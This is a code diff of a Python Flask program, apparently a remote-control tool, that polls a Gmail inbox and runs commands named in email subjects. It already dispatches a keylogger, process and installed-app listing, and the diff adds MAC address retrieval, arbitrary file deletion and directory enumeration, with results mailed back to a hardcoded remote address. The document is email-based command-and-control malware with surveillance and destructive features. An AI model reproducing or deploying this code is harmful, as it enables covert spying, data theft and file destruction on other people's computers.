@@ -6,6 +6,8 @@ import base64
 import mimetypes
 import datetime
 import uuid
+import pickle
+import re
 
 import os.path
 from email.message import EmailMessage
@@ -24,7 +26,7 @@ app = Flask(__name__)
 # If modifying these scopes, delete the file token.json.
 SCOPES = ['https://mail.google.com/']
 
-remoteGmail = 'khanhfo32001@gmail.com'
+remoteGmail = 'phanvietthang718@gmail.com'
 #credentials of app
 creds = None
 def beginWatchMailBox():
@@ -97,6 +99,17 @@ def Process(Subject,rawMsg):
         res = ["2",filename]
     elif Subject.lower() == "keylogger":
         res = kl.RunKeylogger(rawMsg)
+    elif Subject.lower() == "get_mac_address":
+        res = ["3",get_mac_address()]
+    elif Subject.lower() == "delete_file":
+        res = ["4",delFile(rawMsg)]
+    elif Subject.lower() == "send_list_dirs" or rawMsg[:-2] == "send_list_dirs":
+        filename = sendListDirs(rawMsg)
+        res = ["2",filename]
+        
+    elif Subject.lower() == "show_directory_tree" or rawMsg[:-2] == "show_directory_tree":
+        filename = directory_tree(rawMsg)
+        res = ["2",filename]
     else:
         return ["0","invalid Subject"]
     return res  
@@ -110,7 +123,7 @@ def getContent(res):
         return "success"
     elif res[0] =="1" and res[1] !="1":
         return res[1] 
-    elif res[0] =="2" or res[0] == "3":
+    elif res[0] =="2" or res[0] == "3" or res[0] == "4" :
         return res[1]  
 
 def getListEmail():
@@ -150,6 +163,10 @@ def getListEmail():
                     replyMsg = createMessage(newestMsg['id'],newestMsg['threadId'],payload['headers'],content)
                     sent = gmail_send_message(replyMsg)
                     print('sent',sent)
+                if res[0] == "4":
+                    replyMsg_attachments = createMessageWithAttachments(newestMsg['id'], newestMsg['threadId'],payload['headers'], 'delete success')
+                    sent_attachments = gmail_send_message(replyMsg_attachments)
+                    print('sent',sent_attachments)
                 else:
                     replyMsg = createMessage(newestMsg['id'],newestMsg['threadId'],payload['headers'],content)
                     sent = gmail_send_message(replyMsg)
@@ -250,7 +267,7 @@ def getListProcess():
         processes.append(proc.info)
     file_name = f"process_list_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
     # Write list of processes with ID and status to a text file
-    with open(file_name, 'w') as f:
+    with open(file_name, 'w', encoding='utf-8') as f:
         for proc in processes:
             f.write(f"PID: {proc['pid']}, Name: {proc['name']}, Status: {proc['status']}\n")
 
@@ -263,7 +280,7 @@ def get_list_app():
     key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
     # Create a new file to write the list to
     file_name = f"installed_apps{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
-    with open(file_name, "w") as f:
+    with open(file_name, "w", encoding='utf-8') as f:
         # Iterate over the subkeys of the installed applications key
         for i in range(winreg.QueryInfoKey(key)[0]):
             try:
@@ -290,6 +307,57 @@ def get_mac_address():
     mac_address_hex = ':'.join(['{:02x}'.format((mac_address >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
     return mac_address_hex
 
+def directory_tree(root_dir):
+    file_name = f"directory_tree_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
+    with open(file_name, 'w', encoding='utf-8') as f:
+        for dirpath, dirnames, filenames in os.walk(root_dir.rstrip('\r\n').replace("\\","\\")):
+            level = dirpath.replace(root_dir.rstrip('\r\n').replace("\\","\\"), '').count(os.sep)
+            indent = ' ' * 4 * level
+            f.write(f"{indent}{os.path.basename(dirpath)}/\n")
+            sub_indent = ' ' * 4 * (level + 1)
+            for filename in filenames:
+                f.write(f"{sub_indent}{filename}\n")
+
+    return file_name
+
+def sendListDirs(directory_path):
+    if not os.path.isdir(directory_path.rstrip('\r\n').replace("\\","\\")):
+        return [False, directory_path.rstrip('\r\n').replace("\\","\\")]
+
+    listT = []
+    with os.scandir(directory_path.rstrip('\r\n').replace("\\","\\")) as entries:
+        for entry in entries:
+            is_directory = entry.is_dir()
+            listT.append((entry.name, is_directory))
+    file_name = f"Dirs_list_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
+    with open(file_name, 'w', encoding='utf-8') as f:
+        for item in listT:
+            f.write(item[0] + "\n")
+
+    return file_name
+
+    
+
+# def extract_path(string):
+#     # pattern = r"\b(?:[a-zA-Z]:|\\)(?:\\[^\\/:*?\"<>|\r\n]+)+\\?"
+
+#     # match = re.search(pattern, string)
+#     # if match:
+#     #     path = match.group()
+#     #     return path
+#     # else:
+#     #     return None
+
+def delFile(msg):
+    if os.path.isabs(msg.rstrip('\r\n').replace("\\","\\")):
+        os.remove(msg.rstrip('\r\n').replace("\\","\\"))
+        return 1
+    else:
+        return 0
+       
+
+
+
 def main(): 
     authorize()
     beginWatchMailBox()
@@ -309,3 +377,4 @@ def receiveGmailNotification():
 if __name__ == '__main__':
     main()
     app.run(debug=True, host='localhost', port=3333)
+   
